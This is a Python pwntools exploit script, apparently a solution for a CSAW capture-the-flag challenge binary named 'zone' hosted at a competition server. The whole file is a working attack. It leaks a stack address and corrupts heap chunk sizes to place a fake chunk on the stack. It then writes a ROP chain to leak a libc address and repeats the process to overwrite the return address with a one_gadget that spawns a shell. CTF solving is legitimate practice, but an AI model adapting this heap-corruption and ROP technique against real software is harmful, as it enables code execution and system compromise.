from pwn import *
import time
import sys
def allocate_block(c, size):
    c.sendline("1")
    c.sendline(str(size))

def delete_block(c):
    c.sendline("2")

def write_block(c, msg):
    c.sendline("3")
    c.sendline(msg)

def print_block(c):
    c.sendline("4")
    msg = c.recvuntil("1)")
    return msg.strip()

def exit(c):
    c.sendline("5")

def main():
    enviroment_vars = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so")}
    context.binary = ELF('./zone')
    context.log_level = 'debug'
    write('flag', 'THIS_IS_THE_FLAG')

    c = None
    if len(sys.argv) == 2 and "debug" in sys.argv[1]:
        c = gdb.debug(context.binary.path, 'break *$ida("main")\nbreak *$ida("alloc_chunk")\n break *0x400ffe\n', env=enviroment_vars)
    elif len(sys.argv) == 2 and "remote" in sys.argv[1]:
        c = remote('pwn.chal.csaw.io', 5223)
    else:
        c = process(context.binary.path, env=enviroment_vars)
    
    c.recvuntil("Environment")
    leaked_stack_ptr = int(c.recv().split(':')[1].strip(), 16)

    print "leaked addr:", hex(leaked_stack_ptr)
    stack_target = leaked_stack_ptr + 0x78
    
    print c.recvuntil("5) Exit")
    # good chunk
    # corrupt size to be 0x80
    allocate_block(c, 64)
    c.recvuntil("5) Exit")
    
    create_corrupt = "A"*64 + "\x80"
    
    write_block(c, create_corrupt) 
    c.recvuntil("5) Exit")
    
    # allocate corrupted chunk
    allocate_block(c, 64)
    
    # free corrupted chunk, placing it in the medchunk list
    c.recvuntil("5) Exit")
    delete_block(c)

    c.recvuntil("5) Exit")
    # alloc corrupted chunk
    allocate_block(c, 128)
    

    # corrupt unallocated small chunk
    # create fake
    fake_chunk_size = p64(0xffffffff)
    fake_chunk_next = p64(stack_target)
    create_fake = "A"*64 + fake_chunk_size + fake_chunk_next

    c.recvuntil("5) Exit")
    write_block(c, create_fake)
    
    # allocate corrupted fake chunk
    c.recvuntil("5) Exit")
    allocate_block(c, 64)

    # allocate a fake chunk on the stack
    c.recvuntil("5) Exit")
    allocate_block(c, 64)

    leak_addr = p64(0x607020)
    pop_rdi = p64(0x0000000000404653)
    puts_addr = p64(0x4009a0)
    main_addr = p64(0x400bc6)
    ropchain = pop_rdi + leak_addr + puts_addr + main_addr 
    c.recvuntil("5) Exit")
    write_block(c, ropchain)
    c.recvuntil("5) Exit\n")
    exit(c)
    leak = u64(c.recvuntil("Environment").split("\n")[0].ljust(8, "\x00"))
    
    libc_base = leak - 456336
    
    print "libc_base:", hex(libc_base)
   
    # DO EXPLOIT A SECOND TIME!
    
    leaked_stack_ptr = int(c.recvuntil("\n").split(':')[1].strip(), 16)

    print "leaked addr:", hex(leaked_stack_ptr)
    stack_target = leaked_stack_ptr + 0x78
    
    print c.recvuntil("5) Exit")
    # good chunk
    # corrupt size to be 0x80
    allocate_block(c, 64)
    c.recvuntil("5) Exit")
    
    create_corrupt = "A"*64 + "\x80"
    
    write_block(c, create_corrupt) 
    c.recvuntil("5) Exit")
    
    # allocate corrupted chunk
    allocate_block(c, 64)
    
    # free corrupted chunk, placing it in the medchunk list
    c.recvuntil("5) Exit")
    delete_block(c)

    c.recvuntil("5) Exit")
    # alloc corrupted chunk
    allocate_block(c, 128)
    

    # corrupt unallocated small chunk
    # create fake
    fake_chunk_size = p64(0xffffffff)
    fake_chunk_next = p64(stack_target)
    create_fake = "A"*64 + fake_chunk_size + fake_chunk_next

    c.recvuntil("5) Exit")
    write_block(c, create_fake)
    
    # allocate corrupted fake chunk
    c.recvuntil("5) Exit")
    allocate_block(c, 64)

    # allocate a fake chunk on the stack
    c.recvuntil("5) Exit")
    allocate_block(c, 64)

    leak_addr = p64(0x607020)
    pop_rdi = p64(0x0000000000404653)
    puts_addr = p64(0x4009a0)
    main_addr = p64(0x400bc6)
    one_gadget = p64(libc_base + 0xf0274)

    c.recvuntil("5) Exit")
    write_block(c, one_gadget)
    c.recvuntil("5) Exit\n")
    exit(c)


    """
    c.recvuntil("5) Exit")
     
    # corrupt chunk
    # create fake chunk
    allocate_block(c, 64)
    c.recvuntil("5) Exit")
   
    fake_chunk_size = p64(0xffffffff)
    fake_chunk_next = p64(stack_target)
    create_fake = "A"*64 + fake_chunk_size + fake_chunk_next
    
    write_block(c, create_fake)
    c.recvuntil("5) Exit")

    # write to stack
    allocate_block(c, 64)    
    c.recvuntil("5) Exit")

    write_block(c, cyclic(0x90, n=8))
    c.recvuntil("5) Exit")
    """

    c.interactive()

main()
